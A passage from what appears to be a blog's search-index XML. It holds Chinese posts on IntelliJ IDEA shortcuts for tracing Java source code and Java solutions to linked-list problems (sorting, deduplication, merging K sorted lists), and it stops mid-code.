src="https://mmbiz.qpic.cn/mmbiz_png/R5ic1icyNBNd5LAY8B98slwCzbMibI8Zsibh0YW4pW3Y9JK1pvBqTz4SZIJZP0BO2p7XrsG31H1PZdPiawvicynqkxxw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="img"></p><p>怎么生成呢？在你所在的类里面点击右键，会出现上下文菜单 Diagrams | Show Diagram，或者快捷键 Ctrl+Alt+Shift+U，便会进入一个类继承图面板。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/R5ic1icyNBNd6TIJDaHFBj9nHFZylSmyWJ82YCA5ndgjqIVAlhf6T38pLYD2P9naVh2icYknDGWHE3mp13jYoDibhg/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="img"></p><p>其实，在群里有读者说，该功能一次只显示一个类，很不方便，可不可以在同一个面板内显示更多的类呢？可以明确的告诉你，是可以的。有两种方式可供参考。</p><p>一是，对于项目不熟悉的情况下，选中其中的某一个类或者接口，点击右键出现上下文选择菜单，选择自己的子类「Ctrl+Alt+B」或者父类「Ctrl+Alt+P」即可。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/R5ic1icyNBNd6TIJDaHFBj9nHFZylSmyWJtDibwU6fYCBGGhJDN7ppCD0qNjmNG2sSS1jdIwkV2EXic32c9Kprh1Vg/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="img"></p><p>二是，对项目熟悉的情况下，直接敲空格，搜索你需要添加的类到面板即可。</p><p>对于我而言，我还是喜欢 IDEA 这种生成类图的方式，让我专注于目前的某一个类或者某几个类。那可不可以显示整个项目的类图呢？是可以的，但需要利用 IDEA 的插件 —— CodeIris「见下图」。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/R5ic1icyNBNd6TIJDaHFBj9nHFZylSmyWJC0umhf1X8OhZhkjiaUt0zymLNcsNdbh0qib15gg5FIKqvF0cWV8xOTzA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="img"></p><blockquote><p>官网地址：plugin.codeiris.com</p></blockquote><p>到底好不好用？感觉上还不错，毕竟这个插件我用的少，不做过多评论，这里可以看一个老外的评论。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/R5ic1icyNBNd6TIJDaHFBj9nHFZylSmyWJmmAZD6TRSqBPOF5ncULZCwWJ6JuIUJhynafvosjE6AQ7PRKyb4BAMw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="img"></p><p>关于类图的生成工具都是次要的，主要在于它能帮助我们直观的分析这个类的关系以及项目的整体结构。</p><h2 id="查看类"><a href="#查看类" class="headerlink" title="查看类"></a><strong>查看类</strong></h2><p>上面已经说了查看类继承图关系的方法，其实我们还有另一种方式来查看，那就是 Ctrl + H 快捷键。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/R5ic1icyNBNd6TIJDaHFBj9nHFZylSmyWJWMG0JWfKFSKJNL55Vw0fLXqVkVjPftD0rIwY0cJNndBI059iamM4cpw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="img"></p><p>如果你要查看一个类里面定义的变量在那些地方被调用，那么需要掌握一下 Ctrl+Alt+F7 这个快捷键，是不是一目了然。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/R5ic1icyNBNd6TIJDaHFBj9nHFZylSmyWJVicVT3HUkRqUlnaULldoibJLIleGeyxaxBqCdJY4Cnx919OW6TVibsPpQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="img"></p><p>如果你要看一个类里面有那些方法，有两个快捷键可供选择 Alt+7 或者 Ctrl+F12，而我更喜欢 Ctrl+F12。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/R5ic1icyNBNd6TIJDaHFBj9nHFZylSmyWJZJQviaRpPmpat1HbsuGXw3umIKThlrgscl04jicx9kweaEggYqfMMYeA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="img"></p><p>有时候，我们需要看一个类/方法的实现类/方法，这时，我们需要用 Ctrl+Alt+B 这个快捷键。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/R5ic1icyNBNd6TIJDaHFBj9nHFZylSmyWJz4BXMfl7ibRiaFbp2TKJe6AZo545TXXsTNwoUCQNCetXIS5xM6fQoT5w/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="img"></p><p>如果你需要查看某个方法的调用链关系，那么就请记住这个快捷键  Ctrl+Alt+H 吧，请注意图中红色的标注部分。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/R5ic1icyNBNd6TIJDaHFBj9nHFZylSmyWJt43pHiblHibA3hdAjlgxkG4xcaicOeFkCZ7M2ib2XBxjFdHiclegcQFPVhg/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="img"></p><p>其实查看某个方法被那些地方调用，还有一个快捷键 Ctrl+B。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/R5ic1icyNBNd6TIJDaHFBj9nHFZylSmyWJsDaVuPgstqGlN0PuHRicqhFs2Nibgib6B0ZLqFnA77sxxPGyxBX3D0BDA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="img"></p><p>最有意思的是，在跟读者聊天中，一个读者说，跳过去了，但是跳不回来了，尴尬。。。</p><p>其实跳回来也是有快捷键的 Ctrl+Alt+左方向键，你还可以试试右方向键。</p><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a><strong>调试</strong></h2><p>当你成为程序员第一天开始，这个技巧就是你必须要掌握的，我在这里说几点我常用的技巧吧。</p><p>关于源码阅读的时候，我习惯用一个万能方法，也许会帮助到你，不清楚的地方就打印调用栈信息，详情如下。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/R5ic1icyNBNd6TIJDaHFBj9nHFZylSmyWJN2dKHzdZvGYMBGiaH9r4ZUArZgfBQVnNOH6SynpIF61wc9BtAWiaVbxA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="img"></p><p>IDEA 调试中有一个牛逼的功能，那便是计算表达式 Alt+F8，见下图。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/R5ic1icyNBNd6TIJDaHFBj9nHFZylSmyWJZdVCpJ42C6XibjpicZWm3qrla2EiarpO9M4ZaGmRaFgicfuF6K9btYP53A/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="img"></p><p>有没有觉得很屌？</p><p>其实 IDEA 还有很多细节的地方做得特别棒，需要你慢慢琢磨。之前我们群里一个同学以为找到了一个 IDEA 的 bug，后来，发现那不是 bug，只是我们不会用它而已《<a href="http://mp.weixin.qq.com/s?__biz=MzIzMzgxOTQ5NA==&amp;mid=2247485483&amp;idx=1&amp;sn=4cd57831fb6fb7eb0d178f18834bc172&amp;chksm=e8fe9422df891d34fe77cf278d0a650f1fb934b6491f864566c1512dfbbad3541a120a610905&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">Struts，你为何死不悔改！</a>》。</p><p>好了，今天的分享就到这里了。</p><p>……</p><p><strong>今日要闻</strong>：一个出现在 Reddit 上面的牛逼程序员。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/R5ic1icyNBNd6TIJDaHFBj9nHFZylSmyWJTVicVDbofjyop37KQbPFib5SIxjJs2dSdibvTEyKlS8FkFK2IKylKlIag/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="img"></p><p>他叫 Ivan Kutskir「伊万·库茨基尔」，做了一个免费的 Photoshop 替代品 PhotoPea，目前正被 150 万人使用。他从 5 年前开始做了，已经超过了 7000 小时「每天约 5 小时」。据他所述，他前三年半的时间里，没有从 PhotoPea 赚过一分钱。后来，他在 PhotoPea 官网最右侧加了一个竖条谷歌联盟广告，才开始赚钱，他目前通过广告收入能过上布拉格的体面生活。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a><strong>参考</strong></h2><p><a href="https://www.reddit.com/r/IAmA/comments/9urjmg/i_made_a_free_alternative_to_photoshop_that_is" target="_blank" rel="noopener">https://www.reddit.com/r/IAmA/comments/9urjmg/i_made_a_free_alternative_to_photoshop_that_is</a></p><p><a href="https://www.photopea.com" target="_blank" rel="noopener">https://www.photopea.com</a></p><p>本文转载自:  <a href="https://mp.weixin.qq.com/s/lNvy0FhmZ7DYdRKBmVWvqA" target="_blank" rel="noopener">用 IDEA 跟踪 Java 源码的技巧</a></p>]]></content>
      
      
      <categories>
          
          <category> 常用工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开发工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>单链表排序</title>
      <link href="/2018/12/27/suan-fa/lian-biao/dan-lian-biao-pai-xu/"/>
      <url>/2018/12/27/suan-fa/lian-biao/dan-lian-biao-pai-xu/</url>
      
        <content type="html"><![CDATA[<h2 id="单链表排序"><a href="#单链表排序" class="headerlink" title="单链表排序"></a>单链表排序</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个单链表，你要写一个函数，对它进行排序，然后返回排序后的链表。</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你的单链表是：4 -> 8 -> 2 -> 1你要返回排序后的链表：1 -> 2 -> 4 -> 8</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ListNode</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    ListNode next<span class="token punctuation">;</span>    <span class="token function">ListNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>      val <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">swap</span><span class="token punctuation">(</span>ListNode a<span class="token punctuation">,</span> ListNode b<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> tmp <span class="token operator">=</span> a<span class="token punctuation">.</span>val<span class="token punctuation">;</span>    a<span class="token punctuation">.</span>val <span class="token operator">=</span> b<span class="token punctuation">.</span>val<span class="token punctuation">;</span>    b<span class="token punctuation">.</span>val <span class="token operator">=</span> tmp<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">quickSort</span><span class="token punctuation">(</span>ListNode head<span class="token punctuation">,</span> ListNode end<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>head <span class="token operator">==</span> end <span class="token operator">||</span> head<span class="token punctuation">.</span>next <span class="token operator">==</span> end<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> pivot <span class="token operator">=</span> head<span class="token punctuation">.</span>val<span class="token punctuation">;</span>    ListNode slow <span class="token operator">=</span> head<span class="token punctuation">,</span> fast <span class="token operator">=</span> head<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>fast <span class="token operator">!=</span> end<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>fast<span class="token punctuation">.</span>val <span class="token operator">&lt;=</span> pivot<span class="token punctuation">)</span> <span class="token punctuation">{</span>        slow <span class="token operator">=</span> slow<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        <span class="token function">swap</span><span class="token punctuation">(</span>slow<span class="token punctuation">,</span> fast<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      fast <span class="token operator">=</span> fast<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">swap</span><span class="token punctuation">(</span>head<span class="token punctuation">,</span> slow<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">quickSort</span><span class="token punctuation">(</span>head<span class="token punctuation">,</span> slow<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">quickSort</span><span class="token punctuation">(</span>slow<span class="token punctuation">.</span>next<span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n*log(n)), Space: O(n)</span>  <span class="token keyword">public</span> ListNode <span class="token function">quickSortList</span><span class="token punctuation">(</span>ListNode head<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">quickSort</span><span class="token punctuation">(</span>head<span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> head<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">private</span> ListNode <span class="token function">mergeTwoSortedLists</span><span class="token punctuation">(</span>ListNode l1<span class="token punctuation">,</span> ListNode l2<span class="token punctuation">)</span> <span class="token punctuation">{</span>    ListNode dummy <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ListNode</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> p <span class="token operator">=</span> dummy<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>l1 <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> l2 <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>l1<span class="token punctuation">.</span>val <span class="token operator">&lt;</span> l2<span class="token punctuation">.</span>val<span class="token punctuation">)</span> <span class="token punctuation">{</span>        p<span class="token punctuation">.</span>next <span class="token operator">=</span> l1<span class="token punctuation">;</span>        l1 <span class="token operator">=</span> l1<span class="token punctuation">.</span>next<span class="token punctuation">;</span>      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        p<span class="token punctuation">.</span>next <span class="token operator">=</span> l2<span class="token punctuation">;</span>        l2 <span class="token operator">=</span> l2<span class="token punctuation">.</span>next<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      p <span class="token operator">=</span> p<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>l1 <span class="token operator">!=</span> null<span class="token punctuation">)</span> p<span class="token punctuation">.</span>next <span class="token operator">=</span> l1<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>l2 <span class="token operator">!=</span> null<span class="token punctuation">)</span> p<span class="token punctuation">.</span>next <span class="token operator">=</span> l2<span class="token punctuation">;</span>    <span class="token keyword">return</span> dummy<span class="token punctuation">.</span>next<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n*log(n)), Space: O(log(n))</span>  <span class="token keyword">public</span> ListNode <span class="token function">mergeSortList</span><span class="token punctuation">(</span>ListNode head<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>head <span class="token operator">==</span> null <span class="token operator">||</span> head<span class="token punctuation">.</span>next <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> head<span class="token punctuation">;</span>    ListNode fast <span class="token operator">=</span> head<span class="token punctuation">,</span> slow <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>fast<span class="token punctuation">.</span>next <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> fast<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>      slow <span class="token operator">=</span> slow<span class="token punctuation">.</span>next<span class="token punctuation">;</span>      fast <span class="token operator">=</span> fast<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    ListNode right <span class="token operator">=</span> <span class="token function">mergeSortList</span><span class="token punctuation">(</span>slow<span class="token punctuation">.</span>next<span class="token punctuation">)</span><span class="token punctuation">;</span>    slow<span class="token punctuation">.</span>next <span class="token operator">=</span> null<span class="token punctuation">;</span>    ListNode left <span class="token operator">=</span> <span class="token function">mergeSortList</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">mergeTwoSortedLists</span><span class="token punctuation">(</span>left<span class="token punctuation">,</span> right<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有序链表去重</title>
      <link href="/2018/12/27/suan-fa/lian-biao/you-xu-lian-biao-qu-chong/"/>
      <url>/2018/12/27/suan-fa/lian-biao/you-xu-lian-biao-qu-chong/</url>
      
        <content type="html"><![CDATA[<h2 id="有序链表去重"><a href="#有序链表去重" class="headerlink" title="有序链表去重"></a>有序链表去重</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个单链表，这个单链表节点上的数字是<strong>有序</strong>的。对于出现多次的数字，你要把重复的去掉，<strong>只保留一个即可</strong>。最后返回去重后的单链表。</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你的有序单链表是：1 -> 1 -> 2 -> 2 -> 4去重后，你要返回的链表是：1 -> 2 -> 4</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ListNode</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    ListNode next<span class="token punctuation">;</span>    <span class="token function">ListNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>      val <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(1)</span>  <span class="token keyword">public</span> ListNode <span class="token function">removeDuplicatesInSortedList</span><span class="token punctuation">(</span>ListNode head<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>head <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> null<span class="token punctuation">;</span>    ListNode cur <span class="token operator">=</span> head<span class="token punctuation">,</span> next <span class="token operator">=</span> head<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>next <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>cur<span class="token punctuation">.</span>val <span class="token operator">==</span> next<span class="token punctuation">.</span>val<span class="token punctuation">)</span>        cur<span class="token punctuation">.</span>next <span class="token operator">=</span> next<span class="token punctuation">.</span>next<span class="token punctuation">;</span>      <span class="token keyword">else</span>        cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>next<span class="token punctuation">;</span>      next <span class="token operator">=</span> next<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> head<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>合并K个有序链表</title>
      <link href="/2018/12/27/suan-fa/lian-biao/he-bing-k-ge-you-xu-lian-biao/"/>
      <url>/2018/12/27/suan-fa/lian-biao/he-bing-k-ge-you-xu-lian-biao/</url>
      
        <content type="html"><![CDATA[<h2 id="合并K个有序链表"><a href="#合并K个有序链表" class="headerlink" title="合并K个有序链表"></a>合并K个有序链表</h2><p><strong>问题</strong></p><p>这个题目说的是，给你 K 个递增排序的单链表，你要把它们合成一个链表，并且保持递增排序。合成链表的节点直接使用 K 个链表中的节点即可，无需创建新节点。</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你以下 3 个有序链表：1 -> 2 -> 41 -> 4 -> 80 -> 2合并后的有序链表是：0 -> 1 -> 1 -> 2 -> 2 -> 4 -> 4 -> 8</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ListNode</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    ListNode next<span class="token punctuation">;</span>    <span class="token function">ListNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>      val <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">private</span> ListNode <span class="token function">mergeTwoSortedLists</span><span class="token punctuation">(</span>ListNode l1<span class="token punctuation">,</span> ListNode l2<span class="token punctuation">)</span> <span class="token punctuation">{</span>    ListNode dummy <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ListNode</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> p <span class="token operator">=</span> dummy<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>l1 <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> l2 <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>l1<span class="token punctuation">.</span>val <span class="token operator">&lt;</span> l2<span class="token punctuation">.</span>val<span class="token punctuation">)</span> <span class="token punctuation">{</span>        p<span class="token punctuation">.</span>next <span class="token operator">=</span> l1<span class="token punctuation">;</span>        l1 <span class="token operator">=</span> l1<span class="token punctuation">.</span>next<span class="token punctuation">;</span>      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        p<span class="token punctuation">.</span>next <span class="token operator">=</span> l2<span class="token punctuation">;</span>        l2 <span class="token operator">=</span> l2<span class="token punctuation">.</span>next<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      p <span class="token operator">=</span> p<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>l1 <span class="token operator">!=</span> null<span class="token punctuation">)</span> p<span class="token punctuation">.</span>next <span class="token operator">=</span> l1<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>l2 <span class="token operator">!=</span> null<span class="token punctuation">)</span> p<span class="token punctuation">.</span>next <span class="token operator">=</span> l2<span class="token punctuation">;</span>    <span class="token keyword">return</span> dummy<span class="token punctuation">.</span>next<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(k*n), Space: O(1)</span>  <span class="token keyword">public</span> ListNode <span class="token function">mergeKSortedListsOneByOne</span><span class="token punctuation">(</span>ListNode<span class="token punctuation">[</span><span class="token punctuation">]</span> lists<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>lists <span class="token operator">==</span> null <span class="token operator">||</span> lists<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> null<span class="token punctuation">;</span>    ListNode result <span class="token operator">=</span> null<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>ListNode list<span class="token operator">:</span> lists<span class="token punctuation">)</span> <span class="token punctuation">{</span>      result <span class="token operator">=</span> <span class="token function">mergeTwoSortedLists</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> list<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n*log(k)), Space: O(k)</span>  <span class="token keyword">public</span> ListNode <span class="token function">mergeKSortedListsMinHeap</span><span class="token punctuation">(</span>ListNode<span class="token punctuation">[</span><span class="token punctuation">]</span> lists<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>lists <span class="token operator">==</span> null <span class="token operator">||</span> lists<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> null<span class="token punctuation">;</span>    Queue<span class="token operator">&lt;</span>ListNode<span class="token operator">></span> q <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> a<span class="token punctuation">.</span>val <span class="token operator">-</span> b<span class="token punctuation">.</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>ListNode list<span class="token operator">:</span> lists<span class="token punctuation">)</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>list <span class="token operator">!=</span> null<span class="token punctuation">)</span>        q<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>    ListNode dummy <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ListNode</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> p <span class="token operator">=</span> dummy<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>q<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      ListNode min <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      p<span class="token punctuation">.</span>next <span class="token operator">=</span> min<span class="token punctuation">;</span>      p <span class="token operator">=</span> p<span class="token punctuation">.</span>next<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>min<span class="token punctuation">.</span>next <span class="token operator">!=</span> null<span class="token punctuation">)</span> q<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>min<span class="token punctuation">.</span>next<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> dummy<span class="token punctuation">.</span>next<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">private</span> ListNode <span class="token function">merge</span><span class="token punctuation">(</span>ListNode<span class="token punctuation">[</span><span class="token punctuation">]</span> lists<span class="token punctuation">,</span> <span class="token keyword">int</span> start<span class="token punctuation">,</span> <span class="token keyword">int</span> end<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>start <span class="token operator">==</span> end<span class="token punctuation">)</span> <span class="token keyword">return</span> lists<span class="token punctuation">[</span>start<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>start <span class="token operator">></span> end<span class="token punctuation">)</span> <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token keyword">int</span> mid <span class="token operator">=</span> start <span class="token operator">+</span> <span class="token punctuation">(</span>end <span class="token operator">-</span> start<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>    ListNode left <span class="token operator">=</span> <span class="token function">merge</span><span class="token punctuation">(</span>lists<span class="token punctuation">,</span> start<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">;</span>    ListNode right <span class="token operator">=</span> <span class="token function">merge</span><span class="token punctuation">(</span>lists<span class="token punctuation">,</span> mid<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">mergeTwoSortedLists</span><span class="token punctuation">(</span>left<span class="token punctuation">,</span> right<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n*log(k)), Space: O(log(k))</span>  <span class="token keyword">public</span> ListNode <span class="token function">mergeKSortedListsDivideConquer</span><span class="token punctuation">(</span>ListNode<span class="token punctuation">[</span><span class="token punctuation">]</span> lists<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>lists <span class="token operator">==</span> null <span class="token operator">||</span> lists<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token 